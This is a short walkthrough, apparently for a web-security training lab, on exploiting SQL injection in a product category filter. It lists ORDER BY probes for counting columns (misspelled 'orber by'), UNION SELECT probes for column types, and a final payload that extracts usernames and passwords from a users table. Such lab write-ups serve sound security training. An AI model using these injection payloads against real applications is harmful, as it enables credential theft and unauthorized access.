This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response, so you can use a UNION attack to retrieve data from other tables. 
To construct such an attack, you need to combine some of the techniques you learned in previous labs.

The database contains a different table called users, with columns called username and password.

To solve the lab, perform a SQL injection UNION attack that retrieves all usernames and passwords, and use the information to log in as the administrator user. 


End Goal: 
- output the usernames and passwords in the users table  
- login as the administrator user.

Analysis:
--------

1) Determine # of columns that the vulnerable query is using 
' orber by 1--
' orber by 2--
' orber by 3-- => internal server error

2) Determine the data type of the columns

select a, b from products where category="Gifts"

' UNION select 'a', NULL--
' UNION select 'a', 'a'--
- both columns are of data type string

' UNION select username, password from users--
